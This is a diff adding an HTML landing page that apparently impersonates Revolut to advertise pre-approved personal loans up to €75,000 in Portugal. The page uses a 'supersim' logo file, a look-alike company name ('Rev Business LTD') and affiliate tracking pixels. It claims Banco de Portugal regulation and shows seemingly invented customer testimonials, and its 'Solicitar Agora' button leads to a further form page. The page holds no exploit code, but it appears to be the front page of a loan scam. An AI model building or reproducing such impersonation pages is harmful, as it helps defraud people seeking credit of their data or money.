@@ -1,0 +1,346 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+<script>
+(function(){
+  var UTM_KEYS=['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term','fbclid','ttclid','gclid','gbraid','wbraid','click_id','CampaignID']; window.TRACKING_KEYS=UTM_KEYS;
+  var p=new URLSearchParams(window.location.search);
+  UTM_KEYS.forEach(function(k){ if(p.get(k)) localStorage.setItem(k,p.get(k)); });
+  var changed=false;
+  UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!p.has(k)){p.set(k,v);changed=true;} });
+  if(changed) history.replaceState(null,'','?'+p.toString());
+  document.addEventListener('click',function(e){
+    var a=e.target.closest('a');
+    if(a&&a.href){ try{ var u=new URL(a.href,window.location.href); UTM_KEYS.forEach(function(k){ var v=localStorage.getItem(k); if(v&&!u.searchParams.has(k)) u.searchParams.set(k,v); }); a.href=u.toString(); }catch(ex){} }
+  },true);
+})();
+</script>
+  <script>
+function redirectWithParams(destination) {
+const currentParams = window.location.search;
+if (!currentParams) {
+window.location.href = destination;
+return;
+}
+
+if (destination.includes("?")) {
+window.location.href = destination + "&" + currentParams.substring(1);
+} else {
+window.location.href = destination + currentParams;
+}
+}
+</script>
+<meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Revolut – Crédito Pessoal Pré-Aprovado</title>
+  <meta name="description" content="Crédito pessoal pré-aprovado até € 75.000 com a Revolut. TAN desde 4,6%, sem burocracia e com aprovação em 24h.">
+  <link rel="icon" href="images/supersim-logo.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap">
+  <style>
+    :root{
+      --bg:#f5f4f7;
+      --card:#ffffff;
+      --text:#0a0a0a;
+      --text-mid:#3a3a44;
+      --text-light:#6b6b7a;
+      --border:#ececf1;
+      --accent:#0a0a0a;
+      --accent-soft:#efeaff;
+      --accent-purple:#b8a4ff;
+      --star:#f5c518;
+      --radius:22px;
+      --shadow:0 6px 28px rgba(15,15,30,.06);
+    }
+    *{margin:0;padding:0;box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{font-family:'DM Sans',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--text);line-height:1.55;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+
+    .header{position:sticky;top:0;z-index:50;background:#fff;border-bottom:1px solid var(--border)}
+    .header-inner{max-width:520px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;justify-content:space-between}
+    .logo img{height:26px;display:block}
+    .header-cta{background:#0a0a0a;color:#fff;font-weight:600;padding:10px 22px;border-radius:999px;font-size:14px}
+
+    .wrap{max-width:520px;margin:0 auto;padding:0 16px 40px}
+
+    .hero{background:linear-gradient(160deg,#f3eefe 0%,#ece6ff 55%,#f5f0ff 100%);border-radius:0 0 28px 28px;padding:28px 22px 30px;display:flex;flex-direction:row;align-items:flex-start;justify-content:space-between;gap:12px;overflow:hidden}
+    .hero-text{flex:1;min-width:0}
+    .hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.7);backdrop-filter:blur(8px);color:#3a2c6a;font-size:13px;font-weight:600;padding:8px 14px;border-radius:999px;margin-bottom:18px}
+    .hero-badge svg{width:16px;height:16px;color:#6f4ee2}
+    .hero h1{font-family:'Sora',sans-serif;font-size:28px;line-height:1.1;font-weight:800;letter-spacing:-1px;margin-bottom:10px}
+    .hero p{color:var(--text-mid);font-size:14px;margin-bottom:22px}
+    .hero-amount-label{font-size:13px;color:var(--text-light);display:block;margin-bottom:2px}
+    .hero-amount-value{font-family:'Sora',sans-serif;font-size:34px;font-weight:800;letter-spacing:-1.5px}
+    .hero-visual{position:relative;flex-shrink:0;width:120px;height:140px;display:flex;align-items:center;justify-content:center;margin-top:8px}
+    .hero-card3d{width:110px;height:72px;background:linear-gradient(135deg,#fff 0%,#e9dcff 60%,#c5b3ff 100%);border-radius:14px;box-shadow:0 18px 40px rgba(120,90,220,.35),inset 0 1px 0 rgba(255,255,255,.8);transform:rotate(-14deg);display:flex;align-items:center;justify-content:center;font-family:'Sora',sans-serif;font-weight:800;font-size:14px;color:#1a1330}
+    .euro-bubble{position:absolute;width:34px;height:34px;border-radius:50%;background:rgba(255,255,255,.7);display:flex;align-items:center;justify-content:center;font-weight:700;color:#7b5cff;box-shadow:0 6px 18px rgba(120,90,220,.18)}
+    .euro-bubble.b1{top:0;right:0}
+    .euro-bubble.b2{bottom:10px;left:0;width:28px;height:28px;font-size:13px}
+
+    .card{background:var(--card);border-radius:var(--radius);box-shadow:var(--shadow);padding:24px 20px;margin-top:18px}
+    .card-title{font-family:'Sora',sans-serif;font-size:22px;font-weight:700;text-align:center;margin-bottom:4px}
+    .card-sub{text-align:center;color:var(--text-light);font-size:14px;margin-bottom:18px}
+
+    .benefit{display:flex;gap:14px;align-items:center;padding:14px;border:1px solid var(--border);border-radius:16px;margin-bottom:10px}
+    .benefit-icon{width:42px;height:42px;border-radius:12px;background:var(--accent-soft);color:#6f4ee2;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+    .benefit-icon svg{width:20px;height:20px}
+    .benefit-title{font-weight:700;font-size:15px}
+    .benefit-text{font-size:13px;color:var(--text-light)}
+
+    .sim{margin-top:18px;padding:18px 16px;background:#fafafc;border:1px solid var(--border);border-radius:18px;text-align:center}
+    .sim-label{font-size:13px;color:var(--text-light)}
+    .sim-amount{font-family:'Sora',sans-serif;font-size:30px;font-weight:800;letter-spacing:-1px;margin:2px 0 14px}
+    .sim-slider-row{display:flex;align-items:center;gap:10px}
+    .sim-btn{width:34px;height:34px;border-radius:50%;background:#0a0a0a;color:#fff;border:none;font-size:18px;font-weight:700;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;line-height:1}
+    .sim-track{flex:1;height:5px;background:#e7e7ee;border-radius:999px;position:relative}
+    .sim-fill{position:absolute;left:0;top:0;height:100%;background:#0a0a0a;border-radius:999px}
+    .sim-thumb{position:absolute;top:50%;width:18px;height:18px;border-radius:50%;background:#fff;border:2px solid #0a0a0a;transform:translate(-50%,-50%);box-shadow:0 2px 6px rgba(0,0,0,.15)}
+    .sim-range{display:flex;justify-content:space-between;font-size:12px;color:var(--text-light);margin-top:8px;padding:0 4px}
+    .sim-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:14px}
+    .sim-box{background:#fff;border-radius:12px;padding:10px 8px;text-align:center;border:1px solid var(--border)}
+    .sim-box-label{font-size:11px;color:var(--text-light);text-transform:lowercase}
+    .sim-box-value{font-family:'Sora',sans-serif;font-weight:700;font-size:15px;margin-top:2px}
+
+
+    .btn-cta{display:flex;align-items:center;justify-content:center;gap:10px;background:#0a0a0a;color:#fff;border:none;padding:18px 24px;border-radius:14px;font-size:17px;font-weight:700;width:100%;margin-top:18px;cursor:pointer;font-family:inherit}
+    .btn-cta svg{width:18px;height:18px}
+
+    .trust{display:flex;justify-content:space-around;flex-wrap:wrap;gap:14px;border-top:1px solid var(--border);padding-top:18px;margin-top:18px;font-size:12px;color:var(--text-mid)}
+    .trust span{display:inline-flex;align-items:center;gap:6px;font-weight:600}
+    .trust svg{width:14px;height:14px}
+
+    .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:18px}
+    .stat{background:#fff;border-radius:18px;padding:18px 8px;text-align:center;box-shadow:var(--shadow)}
+    .stat-num{font-family:'Sora',sans-serif;font-weight:800;font-size:22px}
+    .stat-lbl{font-size:11px;color:var(--text-light);text-transform:uppercase;letter-spacing:.5px;margin-top:4px}
+
+    .testi-title{font-family:'Sora',sans-serif;font-size:22px;font-weight:700;text-align:center;margin:28px 0 14px}
+    .testi{background:#fff;border-radius:18px;padding:20px;box-shadow:var(--shadow);border-left:4px solid #0a0a0a;margin-bottom:12px}
+    .stars{color:var(--star);font-size:14px;margin-bottom:10px;letter-spacing:2px}
+    .testi-text{font-size:14px;color:var(--text-mid);margin-bottom:14px}
+    .testi-author{display:flex;align-items:center;gap:10px}
+    .avatar{width:34px;height:34px;border-radius:50%;background:#f0eef7;display:flex;align-items:center;justify-content:center;font-weight:700;color:#0a0a0a}
+    .author-name{font-weight:700;font-size:14px}
+    .author-loc{font-size:12px;color:var(--text-light)}
+
+    .footer{background:#fff;border-top:1px solid var(--border);text-align:center;padding:28px 20px 32px;margin-top:24px}
+    .footer-logo img{height:31px;margin-bottom:16px;display:block;margin-left:auto;margin-right:auto}
+    .footer-org{font-weight:700;font-size:14px}
+    .footer-sub{color:var(--text-light);font-size:13px;margin-bottom:14px}
+    .footer-links{display:flex;justify-content:center;gap:10px;font-size:13px;color:var(--text-mid);border-top:1px solid var(--border);padding-top:14px;margin-top:8px;flex-wrap:wrap}
+    .footer-badges{display:flex;justify-content:center;gap:18px;margin-top:14px;font-size:12px;color:var(--text-mid);flex-wrap:wrap}
+    .footer-badges span{display:inline-flex;align-items:center;gap:6px;font-weight:600}
+    .footer-badges svg{width:14px;height:14px}
+    .footer-copy{font-size:11px;color:var(--text-light);margin-top:14px}
+  </style>
+<script>
+  window.pixelId = "6a5594cf5757aed4584adce8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.googlePixelId = "6a45c62144ce1832379750fa";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.tikTokPixelId = "6a5593d07d9a2ac947099389";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+<script defer="" src="js/script.js"></script>
+
+<style id="legal-footer-style">
+  .legal-footer{width:100%;max-width:760px;margin:22px auto 0;padding:18px 16px 26px;text-align:center;color:#6b7280;font-size:11.5px;line-height:1.55}
+  .legal-footer__company{font-weight:700;color:#111827;margin-bottom:2px}
+  .legal-footer__links{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px}
+  .legal-footer__links a{color:#111827;text-decoration:underline;text-underline-offset:3px}
+</style>
+  <script src="js/tracking.js" data-project="revoopt-blue-one" defer=""></script>
+</head>
+<body>
+  <header class="header">
+    <div class="header-inner">
+      <a class="logo" href="index.html" onclick="event.preventDefault();redirectWithParams('index.html');"><img src="images/supersim-logo.svg" alt="Revolut"></a>
+      <a class="header-cta" href="#simulador">Simular</a>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <section class="hero">
+      <div class="hero-text">
+        <div class="hero-badge">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+          Crédito Pré-Aprovado
+        </div>
+        <h1>Crédito Pessoal<br>na Sua Conta</h1>
+        <p>Dinheiro rápido, sem burocracia e com as melhores taxas</p>
+        <div>
+          <span class="hero-amount-label">Limite de até</span>
+          <div class="hero-amount-value">€ 75.000</div>
+        </div>
+      </div>
+      <div class="hero-visual">
+        <span class="euro-bubble b1">€</span>
+        <div class="hero-card3d">Revolut</div>
+        <span class="euro-bubble b2">€</span>
+      </div>
+    </section>
+
+    <section class="card">
+      <h2 class="card-title">Vantagens Exclusivas</h2>
+      <p class="card-sub">Por que milhares escolhem a Revolut</p>
+
+      <div class="benefit">
+        <div class="benefit-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg></div>
+        <div><div class="benefit-title">Crédito na Hora</div><div class="benefit-text">Aprovação em minutos e dinheiro em até 24h</div></div>
+      </div>
+      <div class="benefit">
+        <div class="benefit-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 8c-1.66 0-3 .9-3 2s1.34 2 3 2 3 .9 3 2-1.34 2-3 2m0-8V7m0 10v1m-9-6a9 9 0 1118 0 9 9 0 01-18 0z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg></div>
+        <div><div class="benefit-title">TAN desde 4,6%</div><div class="benefit-text">TAEG desde 5,9%</div></div>
+      </div>
+      <div class="benefit">
+        <div class="benefit-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m5.6-4A11.96 11.96 0 0112 3 11.96 11.96 0 013.4 6 12.02 12.02 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.13-2-.4-3z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg></div>
+        <div><div class="benefit-title">100% Seguro</div><div class="benefit-text">Processo digital protegido e regulamentado</div></div>
+      </div>
+
+      <div class="sim" id="simulador">
+        <div class="sim-label">Simule o seu empréstimo</div>
+        <div class="sim-amount" id="loanAmount">€ 10.000</div>
+        <div class="sim-slider-row">
+          <button class="sim-btn" id="btnMinus" aria-label="Diminuir">−</button>
+          <div class="sim-track" id="track">
+            <div class="sim-fill" id="fill" style="width: 12.1622%;"></div>
+            <div class="sim-thumb" id="thumb" style="left: 12.1622%;"></div>
+          </div>
+          <button class="sim-btn" id="btnPlus" aria-label="Aumentar">+</button>
+        </div>
+        <div class="sim-range"><span>€ 1.000</span><span>€ 75.000</span></div>
+        <div class="sim-grid">
+          <div class="sim-box"><div class="sim-box-label">prestações</div><div class="sim-box-value" id="installments">120x € 104</div></div>
+          <div class="sim-box"><div class="sim-box-label">tan</div><div class="sim-box-value">4,6%</div></div>
+          <div class="sim-box"><div class="sim-box-label">taeg</div><div class="sim-box-value">5,9%</div></div>
+          <div class="sim-box"><div class="sim-box-label">mtic</div><div class="sim-box-value" id="mtic">€ 12.495</div></div>
+        </div>
+      </div>
+
+      <a class="btn-cta" href="2.html" id="btnGo" onclick="event.preventDefault();redirectWithParams('2.html');">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+        Solicitar Agora
+      </a>
+
+      <div class="trust">
+        <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>Dados protegidos</span>
+        <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m5.6-4A11.96 11.96 0 0112 3a11.96 11.96 0 01-8.6 3A12 12 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.13-2-.4-3z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>Banco de Portugal</span>
+        <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>+500 mil clientes</span>
+      </div>
+    </section>
+
+    <section class="stats">
+      <div class="stat"><div class="stat-num">500K+</div><div class="stat-lbl">Clientes</div></div>
+      <div class="stat"><div class="stat-num">24h</div><div class="stat-lbl">Aprovação</div></div>
+      <div class="stat"><div class="stat-num">120x</div><div class="stat-lbl">Prestações</div></div>
+    </section>
+
+    <h3 class="testi-title">O que dizem nossos clientes</h3>
+    <div class="testi">
+      <div class="stars">★★★★★</div>
+      <p class="testi-text">"Consegui meu empréstimo em menos de 24 horas! O processo foi super simples e a taxa é a melhor que encontrei. Recomendo demais!"</p>
+      <div class="testi-author"><div class="avatar">M</div><div><div class="author-name">Maria Silva</div><div class="author-loc">Lisboa</div></div></div>
+    </div>
+    <div class="testi">
+      <div class="stars">★★★★★</div>
+      <p class="testi-text">"Já tentei em vários bancos e sempre tinha muita burocracia. Aqui foi diferente! Tudo online, rápido e transparente."</p>
+      <div class="testi-author"><div class="avatar">J</div><div><div class="author-name">João Santos</div><div class="author-loc">Porto</div></div></div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-logo"><img src="images/supersim-logo.svg" alt="Revolut"></div>
+    <div class="footer-org">Rev Business LTD</div>
+    <div class="footer-sub">Avenida da Liberdade, 110</div>
+    <div class="footer-sub">1269-046 Lisboa, Portugal</div>
+    <div class="footer-links">
+      <a href="termos-de-uso.html">Termos de Uso</a><span>•</span>
+      <a href="politica-de-privacidade.html">Política de Privacidade</a><span>•</span>
+      <a href="#">Contacto</a>
+    </div>
+    <div class="footer-badges">
+      <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>SSL Seguro</span>
+      <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m5.6-4A11.96 11.96 0 0112 3a11.96 11.96 0 01-8.6 3A12 12 0 003 9c0 5.6 3.8 10.3 9 11.6 5.2-1.3 9-6 9-11.6 0-1-.13-2-.4-3z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>Dados protegidos</span>
+      <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 21h18M5 21V7l7-4 7 4v14M9 9h.01M15 9h.01M9 13h.01M15 13h.01M9 17h.01M15 17h.01" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>Instituição regulada</span>
+    </div>
+    <div class="footer-copy">© 2026 Rev Business LTD. Todos os direitos reservados.</div>
+  </footer>
+
+  <script>
+    (function(){
+      const MIN=1000,MAX=75000,STEP=500,TAN=0.046,TAEG=0.059,MONTHS=120;
+      let value=parseFloat(localStorage.getItem('selectedLoanAmount'))||10000;
+      const fmt=n=>'€ '+Math.round(n).toLocaleString('de-DE');
+      const amount=document.getElementById('loanAmount');
+      const fill=document.getElementById('fill');
+      const thumb=document.getElementById('thumb');
+      const inst=document.getElementById('installments');
+      const mtic=document.getElementById('mtic');
+      const track=document.getElementById('track');
+      function calc(){
+        const r=TAN/12,m=value*r/(1-Math.pow(1+r,-MONTHS));
+        const total=m*MONTHS;
+
+        amount.textContent=fmt(value);
+        inst.textContent=MONTHS+'x '+fmt(m);
+        mtic.textContent=fmt(total);
+        const pct=((value-MIN)/(MAX-MIN))*100;
+        fill.style.width=pct+'%';thumb.style.left=pct+'%';
+
+        localStorage.setItem('selectedLoanAmount', value);
+        localStorage.setItem('selectedMonthlyPayment', Math.round(m));
+        localStorage.setItem('selectedInstallments', MONTHS);
+      }
+      calc(); // salva valores iniciais no localStorage
+      document.getElementById('btnMinus').onclick=()=>{value=Math.max(MIN,value-STEP);calc()};
+      document.getElementById('btnPlus').onclick=()=>{value=Math.min(MAX,value+STEP);calc()};
+      function drag(e){
+        const rect=track.getBoundingClientRect();
+        const x=(e.touches?e.touches[0].clientX:e.clientX)-rect.left;
+        const pct=Math.max(0,Math.min(1,x/rect.width));
+        value=Math.round((MIN+pct*(MAX-MIN))/STEP)*STEP;calc();
+      }
+      let dragging=false;
+      track.addEventListener('mousedown', e=>{dragging=true;drag(e);});
+      document.addEventListener('mousemove', e=>{if(dragging)drag(e);});
+      document.addEventListener('mouseup', ()=>{dragging=false;});
+      track.addEventListener('touchstart', e=>{dragging=true;drag(e);},{passive:true});
+      document.addEventListener('touchmove', e=>{if(dragging)drag(e);},{passive:true});
+      document.addEventListener('touchend', ()=>{dragging=false;});
+      track.addEventListener('click', drag);
+    })();
+  </script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'sxb1plzcpnl503952'},{'dcenter':'sxb1'},{'cp_id':'10972497'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script>
+
+<div class="legal-footer">
+  <div class="legal-footer__company">Rev Business LTD</div>
+  <div>Avenida da Liberdade, 110, 1269-046 Lisboa, Portugal</div>
+  <div class="legal-footer__links">
+    <a href="termos-de-uso.html">Termos de Uso</a>
+    <a href="politica-de-privacidade.html">Política de Privacidade</a>
+  </div>
+</div>
+
+</body></html>
